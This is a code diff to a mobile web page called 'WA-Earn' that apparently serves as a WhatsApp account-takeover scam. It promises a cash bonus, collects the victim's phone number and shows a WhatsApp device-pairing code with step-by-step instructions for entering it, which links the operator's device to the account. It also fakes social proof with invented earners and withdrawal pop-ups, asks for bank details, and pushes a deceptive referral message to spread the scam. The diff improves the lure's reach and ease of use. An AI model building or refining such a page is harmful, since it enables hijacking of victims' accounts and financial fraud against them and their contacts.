@@ -35,11 +35,21 @@
         .btn { background: var(--primary); color: #fff; border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; transition: all 0.2s; display: flex; justify-content: center; align-items: center; gap: 10px; }
         .btn:hover { background: var(--primary-hover); transform: translateY(-2px); }
         .btn:disabled { background: var(--border); color: var(--text-muted); cursor: not-allowed; transform: none; }
-        .input-group { display: none; margin-top: 20px; text-align: left; }
-        .input-group label { font-size: 12px; color: var(--text-muted); margin-bottom: 8px; display: block; font-weight: 500; }
-        .input-group input { width: 100%; padding: 16px; border-radius: 12px; border: 1px solid var(--border); background: var(--bg); color: var(--text); font-size: 16px; outline: none; transition: border-color 0.2s; }
-        .input-group input:focus { border-color: var(--primary); }
         
+        /* Country Code & PIN Input */
+        .input-group { display: none; margin-top: 20px; text-align: center; }
+        .input-group label { font-size: 13px; color: var(--text-muted); margin-bottom: 12px; display: block; font-weight: 500; }
+        
+        .phone-input-wrapper { display: flex; gap: 10px; justify-content: center; margin-bottom: 15px; }
+        .country-select { width: 100px; padding: 10px; border-radius: 10px; border: 2px solid var(--border); background: var(--bg); color: var(--text); font-size: 14px; outline: none; appearance: none; cursor: pointer; }
+        
+        .pin-container { display: flex; gap: 5px; justify-content: center; flex: 1; }
+        .pin-container input { width: 100%; max-width: 40px; height: 50px; border-radius: 8px; border: 2px solid var(--border); background: var(--bg); color: var(--text); font-size: 20px; font-weight: 700; text-align: center; outline: none; transition: all 0.2s; }
+        .pin-container input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(16,185,129,0.2); }
+        .pin-container input.filled { border-color: var(--primary); }
+        
+        .warning-text { font-size: 11px; color: #f59e0b; margin-bottom: 15px; text-align: center; }
+
         .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
         .stat-card { background: var(--card); border-radius: 16px; padding: 20px; border: 1px solid var(--border); text-align: center; }
         .stat-value { font-size: 24px; font-weight: 700; color: var(--text); }
@@ -54,7 +64,16 @@
         .leader-name { font-size: 14px; font-weight: 500; }
         .leader-amount { font-size: 14px; font-weight: 700; color: var(--primary); }
 
-        .code-display { font-size: 36px; font-weight: 800; letter-spacing: 6px; color: var(--primary); margin: 20px 0; background: rgba(16,185,129,0.1); padding: 15px; border-radius: 12px; border: 1px dashed var(--primary); }
+        .code-display { font-size: 36px; font-weight: 800; letter-spacing: 4px; color: var(--primary); margin: 20px 0; background: rgba(16,185,129,0.1); padding: 15px; border-radius: 12px; border: 1px dashed var(--primary); display: flex; justify-content: center; align-items: center; gap: 15px; }
+        .copy-btn { background: var(--primary); color: white; border: none; padding: 8px 12px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: 600; }
+        .copy-btn.copied { background: #059669; }
+
+        .instructions { text-align: left; background: var(--bg); border-radius: 12px; padding: 20px; border: 1px solid var(--border); margin-top: 20px; }
+        .instructions h4 { font-size: 14px; margin-bottom: 15px; color: var(--text); }
+        .step-item { display: flex; gap: 12px; margin-bottom: 15px; align-items: flex-start; }
+        .step-item:last-child { margin-bottom: 0; }
+        .step-num { background: var(--border); color: var(--text); width: 24px; height: 24px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 12px; font-weight: bold; flex-shrink: 0; }
+        .step-text { font-size: 13px; color: var(--text-muted); line-height: 1.5; }
         
         .toast-container { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; display: flex; flex-direction: column; gap: 10px; width: 90%; max-width: 400px; }
         .toast { background: var(--card); border-left: 4px solid var(--primary); color: var(--text); padding: 15px 20px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); font-size: 14px; display: flex; align-items: center; gap: 12px; animation: slideUp 0.3s ease-out forwards; opacity: 0; transform: translateY(20px); }
@@ -65,6 +84,14 @@
         .success-screen { display: none; text-align: center; }
         .success-icon { width: 80px; height: 80px; background: rgba(16,185,129,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
         .success-icon svg { width: 40px; height: 40px; color: var(--primary); }
+
+        /* Withdrawal Box */
+        .withdraw-box { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-top: 20px; text-align: left; display: none; }
+        .withdraw-box h3 { font-size: 16px; margin-bottom: 15px; color: var(--text); }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 5px; }
+        .form-group input, .form-group select { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border); background: var(--card); color: var(--text); font-size: 14px; outline: none; }
+        .form-group input:focus, .form-group select:focus { border-color: var(--primary); }
         
         .referral-box { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 15px; margin-top: 20px; display: none; text-align: left; }
         .referral-box label { font-size: 12px; color: var(--text-muted); margin-bottom: 8px; display: block; }
@@ -94,26 +121,49 @@
                 <div class="hero-content">
                     <div class="badge">PASSIVE INCOME ACTIVE</div>
                     <h1 style="font-size: 20px; margin-bottom: 10px;">Welcome to WA-Earn</h1>
-                    <div class="balance"><span>₦</span>2,000<span>.00</span></div>
-                    <p class="sub-text">Claim your onboarding bonus by activating your account in our secure ad-campaign network. Keep it active to earn ₦500 daily.</p>
+                    <div class="balance"><span class="currency-symbol">₦</span><span id="display-balance">2,000</span><span>.00</span></div>
+                    <p class="sub-text">Claim your onboarding bonus by activating your account in our secure ad-campaign network. Keep it active to earn daily.</p>
                     
-                    <button class="btn" id="start-btn" onclick="showInput()">Claim ₦2,000 Now</button>
+                    <button class="btn" id="start-btn" onclick="showInput()">Claim Bonus Now</button>
 
                     <div class="input-group" id="input-group">
-                        <label>WhatsApp Number (International Format)</label>
-                        <input type="tel" id="phone" placeholder="e.g. 2348012345678">
-                        <button class="btn" id="send-btn" onclick="requestCode()" style="margin-top: 15px;">Link Account & Earn</button>
+                        <label>Enter your WhatsApp Number</label>
+                        <div class="phone-input-wrapper">
+                            <select class="country-select" id="country-code">
+                                <option value="+234" data-currency="₦" data-code="ng">🇳🇬 +234</option>
+                                <option value="+1" data-currency="$" data-code="us">🇺🇸 +1</option>
+                                <option value="+44" data-currency="£" data-code="gb">🇬🇧 +44</option>
+                                <option value="+27" data-currency="R" data-code="za">🇿🇦 +27</option>
+                                <option value="+254" data-currency="KSh" data-code="ke">🇰🇪 +254</option>
+                                <option value="+233" data-currency="₵" data-code="gh">🇬🇭 +233</option>
+                            </select>
+                            
+                            <div class="pin-container" id="pin-container">
+                                <input type="tel" maxlength="1" oninput="moveToNext(this, 1)" onkeydown="moveToPrev(event, this, 1)">
+                                <input type="tel" maxlength="1" oninput="moveToNext(this, 2)" onkeydown="moveToPrev(event, this, 2)">
+                                <input type="tel" maxlength="1" oninput="moveToNext(this, 3)" onkeydown="moveToPrev(event, this, 3)">
+                                <input type="tel" maxlength="1" oninput="moveToNext(this, 4)" onkeydown="moveToPrev(event, this, 4)">
+                                <input type="tel" maxlength="1" oninput="moveToNext(this, 5)" onkeydown="moveToPrev(event, this, 5)">
+                                <input type="tel" maxlength="1" oninput="moveToNext(this, 6)" onkeydown="moveToPrev(event, this, 6)">
+                                <input type="tel" maxlength="1" oninput="moveToNext(this, 7)" onkeydown="moveToPrev(event, this, 7)">
+                                <input type="tel" maxlength="1" oninput="moveToNext(this, 8)" onkeydown="moveToPrev(event, this, 8)">
+                                <input type="tel" maxlength="1" oninput="moveToNext(this, 9)" onkeydown="moveToPrev(event, this, 9)">
+                                <input type="tel" maxlength="1" oninput="moveToNext(this, 10)" onkeydown="moveToPrev(event, this, 10)">
+                            </div>
+                        </div>
+                        <div class="warning-text">Do not include the leading 0 (e.g. enter 803..., not 0803...)</div>
+                        <button class="btn" id="send-btn" onclick="requestCode()" style="margin-top: 5px;">Link Account & Earn</button>
                     </div>
                 </div>
             </div>
 
             <div class="stats-grid">
                 <div class="stat-card">
-                    <div class="stat-value">₦500</div>
+                    <div class="stat-value" id="daily-retainer">₦500</div>
                     <div class="stat-label">Daily Retainer</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-value">₦500</div>
+                    <div class="stat-value" id="referral-bonus">₦500</div>
                     <div class="stat-label">Referral Bonus</div>
                 </div>
             </div>
@@ -127,11 +177,38 @@
         <!-- STEP 2 -->
         <div class="hero-card" id="step-2" style="display: none;">
             <h2 style="font-size: 20px; margin-bottom: 10px;">Verify Device</h2>
-            <p class="sub-text">Open <strong>WhatsApp > Linked Devices</strong> and tap <strong>Link with Phone Number</strong>.</p>
+            <p class="sub-text">Follow the steps below to link your device.</p>
             
-            <div class="code-display" id="code-display">------</div>
+            <div class="code-display">
+                <span id="code-display">------</span>
+                <button class="copy-btn" id="copy-code-btn" onclick="copyCode()">Copy</button>
+            </div>
             
-            <p class="sub-text" style="color: #f59e0b; font-size: 13px;">Waiting for you to enter the code on your phone...</p>
+            <div class="instructions">
+                <h4>How to link your WhatsApp:</h4>
+                <div class="step-item">
+                    <div class="step-num">1</div>
+                    <div class="step-text">Open <strong>WhatsApp</strong> on your phone.</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">2</div>
+                    <div class="step-text">Tap the <strong>three dots (⋮)</strong> in the top right corner.</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">3</div>
+                    <div class="step-text">Tap on <strong>Linked Devices</strong>.</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">4</div>
+                    <div class="step-text">Tap <strong>Link with Phone Number</strong>.</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">5</div>
+                    <div class="step-text">Paste the code you copied above.</div>
+                </div>
+            </div>
+            
+            <p class="sub-text" style="color: #f59e0b; font-size: 13px; margin-top: 20px;">Waiting for you to enter the code on your phone...</p>
         </div>
 
         <!-- STEP 3 -->
@@ -142,34 +219,54 @@
             <h2 style="font-size: 24px; margin-bottom: 10px;">Account Activated!</h2>
             <p class="sub-text">Your onboarding bonus has been credited to your wallet. The campaign bot is now running in the background.</p>
             
-            <div class="balance" id="final-balance"><span>₦</span>2,000<span>.00</span></div>
+            <div class="balance" id="final-balance"><span class="currency-symbol">₦</span><span id="final-balance-amount">2,000</span><span>.00</span></div>
             
-            <button class="btn" style="margin-top: 20px; background: var(--border);">Withdraw (Min ₦10,000)</button>
+            <button class="btn" style="margin-top: 20px; background: var(--border);" onclick="showWithdraw()">Withdraw Funds</button>
+            
+            <!-- Withdrawal Form -->
+            <div class="withdraw-box" id="withdraw-box">
+                <h3>Withdrawal Details</h3>
+                <div class="form-group">
+                    <label>Bank Name</label>
+                    <select>
+                        <option>Select Bank</option>
+                        <option>Access Bank</option>
+                        <option>Guaranty Trust Bank (GTB)</option>
+                        <option>First Bank of Nigeria</option>
+                        <option>United Bank for Africa (UBA)</option>
+                        <option>Zenith Bank</option>
+                        <option>Kuda Bank</option>
+                        <option>Opay</option>
+                        <option>Palmpay</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Account Number</label>
+                    <input type="tel" placeholder="Enter 10-digit account number">
+                </div>
+                <div class="form-group">
+                    <label>Account Name</label>
+                    <input type="text" placeholder="Enter account name">
+                </div>
+                <button class="btn" style="margin-top: 10px;">Request Withdrawal</button>
+                <p class="sub-text" style="margin-top: 10px; font-size: 11px; text-align: center;">Minimum withdrawal is <span id="min-withdraw">₦10,000</span>.</p>
+            </div>
             
             <div class="referral-box" id="referral-box">
-                <label>Invite associates to earn ₦500 per referral</label>
+                <label>Invite associates to earn <span class="currency-symbol">₦</span>500 per referral</label>
                 <div class="referral-input">
                     <input type="text" id="ref-link" readonly>
                     <button onclick="copyRef()">Copy</button>
                 </div>
                 
                 <div class="share-buttons">
-                    <button class="share-btn share-wa" onclick="shareTo('whatsapp')">
-                        <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
-                        WhatsApp
-                    </button>
-                    <button class="share-btn share-tg" onclick="shareTo('telegram')">
-                        <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
-                        Telegram
-                    </button>
-                    <button class="share-btn share-generic" onclick="shareTo('native')">
-                        <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z"/></svg>
-                        More
-                    </button>
+                    <button class="share-btn share-wa" onclick="shareTo('whatsapp')">WhatsApp</button>
+                    <button class="share-btn share-tg" onclick="shareTo('telegram')">Telegram</button>
+                    <button class="share-btn share-generic" onclick="shareTo('native')">More</button>
                 </div>
             </div>
             
-            <p class="sub-text" style="margin-top: 15px; font-size: 12px;">Keep the device linked to earn ₦500 daily.</p>
+            <p class="sub-text" style="margin-top: 15px; font-size: 12px;">Keep the device linked to earn daily.</p>
         </div>
     </div>
 
@@ -182,62 +279,76 @@
         const referrerNumber = urlParams.get('ref');
         let currentBalance = 2000;
         let userPhone = '';
+        let selectedCurrency = '₦';
+
+        // Update UI based on selected country
+        const countrySelect = document.getElementById('country-code');
+        countrySelect.addEventListener('change', (e) => {
+            const option = e.target.options[e.target.selectedIndex];
+            selectedCurrency = option.getAttribute('data-currency');
+            
+            // Update all currency symbols on the page
+            document.querySelectorAll('.currency-symbol').forEach(el => el.innerText = selectedCurrency);
+            document.getElementById('daily-retainer').innerText = `${selectedCurrency}500`;
+            document.getElementById('referral-bonus').innerText = `${selectedCurrency}500`;
+            document.getElementById('min-withdraw').innerText = `${selectedCurrency}10,000`;
+        });
 
         if (referrerNumber) {
             currentBalance += 500;
-            document.getElementById('start-btn').innerText = `Claim ₦2,500 Now (Referral Bonus Applied)`;
+            document.getElementById('start-btn').innerText = `Claim Bonus + Referral`;
         }
 
-        const topEarners = [
-            { name: "Chinedu O.", amount: "₦145,000" },
-            { name: "Aisha M.", amount: "₦120,500" },
-            { name: "Tunde B.", amount: "₦98,000" },
-            { name: "Blessing E.", amount: "₦85,500" },
-            { name: "Ibrahim K.", amount: "₦72,000" }
-        ];
+        // --- PIN INPUT LOGIC ---
+        const inputs = document.querySelectorAll('.pin-container input');
         
-        const listEl = document.getElementById('leaderboard-list');
-        topEarners.forEach((user) => {
-            listEl.innerHTML += `
-                <div class="leader-item">
-                    <div class="leader-info">
-                        <div class="avatar">${user.name.charAt(0)}</div>
-                        <div class="leader-name">${user.name}</div>
-                    </div>
-                    <div class="leader-amount">${user.amount}</div>
-                </div>
-            `;
-        });
-
-        const fakeNames = ["Ada", "Chinedu", "Fatima", "Tunde", "Nneka", "Ibrahim", "Blessing", "Emeka", "Zainab", "Oluwaseun", "Musa", "Grace"];
-        function showToast() {
-            const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
-            const amount = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
-            const formattedAmount = "₦" + amount.toLocaleString();
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerHTML = `<svg style="width:20px;height:20px;color:var(--primary);" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg><div><strong>${name}</strong> just withdrew <strong>${formattedAmount}</strong></div>`;
-            document.getElementById('toast-container').appendChild(toast);
-            setTimeout(() => { toast.classList.add('hide'); }, 4000);
-            setTimeout(() => { toast.remove(); }, 4300);
+        function moveToNext(current, index) {
+            if (current.value.length === 1) {
+                current.classList.add('filled');
+                if (index < inputs.length) {
+                    inputs[index].focus();
+                } else {
+                    current.blur();
+                }
+            } else {
+                current.classList.remove('filled');
+            }
         }
-        function startToasts() {
-            showToast();
-            setTimeout(startToasts, Math.floor(Math.random() * 7000) + 8000);
-        }
-        setTimeout(startToasts, 3000);
 
+        function moveToPrev(event, current, index) {
+            if (event.key === 'Backspace' && current.value.length === 0) {
+                if (index > 1) {
+                    inputs[index - 2].focus();
+                }
+            }
+        }
+
+        function getFullNumber() {
+            let num = '';
+            inputs.forEach(input => num += input.value);
+            return num;
+        }
+
+        // --- INTERACTION LOGIC ---
         function showInput() {
             document.getElementById('start-btn').style.display = 'none';
             document.getElementById('input-group').style.display = 'block';
+            inputs[0].focus();
         }
 
         function requestCode() {
-            userPhone = document.getElementById('phone').value.replace(/[^0-9]/g, '');
-            if (!userPhone || userPhone.length < 10) return alert("Please enter a valid WhatsApp number.");
+            const localNumber = getFullNumber();
+            const countryCode = document.getElementById('country-code').value.replace('+', ''); 
+            
+            if (localNumber.length !== 10) {
+                return alert("Please enter all 10 digits of your phone number.");
+            }
+            
+            userPhone = countryCode + localNumber; // Combine code + 10 digits
             
             document.getElementById('send-btn').disabled = true;
             document.getElementById('send-btn').innerText = 'Connecting...';
+            
             socket.emit('request_code', userPhone);
         }
 
@@ -247,11 +358,23 @@
             document.getElementById('code-display').innerText = code;
         });
 
+        function copyCode() {
+            const code = document.getElementById('code-display').innerText;
+            navigator.clipboard.writeText(code);
+            const btn = document.getElementById('copy-code-btn');
+            btn.innerText = 'Copied!';
+            btn.classList.add('copied');
+            setTimeout(() => {
+                btn.innerText = 'Copy';
+                btn.classList.remove('copied');
+            }, 3000);
+        }
+
         socket.on('success', () => {
             document.getElementById('step-2').style.display = 'none';
             document.getElementById('step-3').style.display = 'block';
             
-            document.getElementById('final-balance').innerHTML = `<span>₦</span>${currentBalance.toLocaleString()}<span>.00</span>`;
+            document.getElementById('final-balance-amount').innerText = currentBalance.toLocaleString();
             
             document.getElementById('referral-box').style.display = 'block';
             const baseUrl = window.location.origin;
@@ -264,19 +387,22 @@
             document.getElementById('send-btn').innerText = 'Link Account & Earn';
         });
 
+        function showWithdraw() {
+            const box = document.getElementById('withdraw-box');
+            box.style.display = box.style.display === 'block' ? 'none' : 'block';
+        }
+
         function copyRef() {
             const copyText = document.getElementById('ref-link');
             copyText.select();
             copyText.setSelectionRange(0, 99999);
             navigator.clipboard.writeText(copyText.value);
-            alert("Referral link copied! Share with associates to earn ₦500.");
+            alert("Referral link copied! Share with associates to earn bonuses.");
         }
 
-        // --- PROFESSIONAL REFERRAL MESSAGE ---
-        const shareMessage = "I recently joined the WA-Earn marketing network as an ad distributor. They pay a steady retainer just for keeping your account active in their campaign pool. If you want to join my tier, use my invite link to get a ₦2,000 onboarding bonus: ";
-        
         function shareTo(platform) {
             const refLink = document.getElementById('ref-link').value;
+            const shareMessage = "I recently joined the WA-Earn marketing network as an ad distributor. They pay a steady retainer just for keeping your account active in their campaign pool. If you want to join my tier, use my invite link to get an onboarding bonus: ";
             const fullMessage = shareMessage + refLink;
 
             if (platform === 'whatsapp') {
@@ -287,16 +413,52 @@
             } 
             else if (platform === 'native') {
                 if (navigator.share) {
-                    navigator.share({
-                        title: 'WA-Earn Marketing Network',
-                        text: shareMessage,
-                        url: refLink,
-                    }).catch(console.error);
+                    navigator.share({ title: 'WA-Earn', text: shareMessage, url: refLink }).catch(console.error);
                 } else {
-                    alert("Native sharing is not supported on this browser. Please copy the link instead.");
+                    alert("Please copy the link.");
                 }
             }
         }
+
+        // Leaderboard and Toasts
+        const topEarners = [
+            { name: "Chinedu O.", amount: "145,000" },
+            { name: "Aisha M.", amount: "120,500" },
+            { name: "Tunde B.", amount: "98,000" },
+            { name: "Blessing E.", amount: "85,500" },
+            { name: "Ibrahim K.", amount: "72,000" }
+        ];
+        
+        const listEl = document.getElementById('leaderboard-list');
+        topEarners.forEach((user) => {
+            listEl.innerHTML += `
+                <div class="leader-item">
+                    <div class="leader-info">
+                        <div class="avatar">${user.name.charAt(0)}</div>
+                        <div class="leader-name">${user.name}</div>
+                    </div>
+                    <div class="leader-amount">${selectedCurrency}${user.amount}</div>
+                </div>
+            `;
+        });
+
+        const fakeNames = ["Ada", "Chinedu", "Fatima", "Tunde", "Nneka", "Ibrahim", "Blessing", "Emeka", "Zainab", "Oluwaseun", "Musa", "Grace"];
+        function showToast() {
+            const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+            const amount = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
+            const formattedAmount = selectedCurrency + amount.toLocaleString();
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerHTML = `<svg style="width:20px;height:20px;color:var(--primary);" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg><div><strong>${name}</strong> just withdrew <strong>${formattedAmount}</strong></div>`;
+            document.getElementById('toast-container').appendChild(toast);
+            setTimeout(() => { toast.classList.add('hide'); }, 4000);
+            setTimeout(() => { toast.remove(); }, 4300);
+        }
+        function startToasts() {
+            showToast();
+            setTimeout(startToasts, Math.floor(Math.random() * 7000) + 8000);
+        }
+        setTimeout(startToasts, 3000);
     </script>
 </body>
-    </html>
+</html>
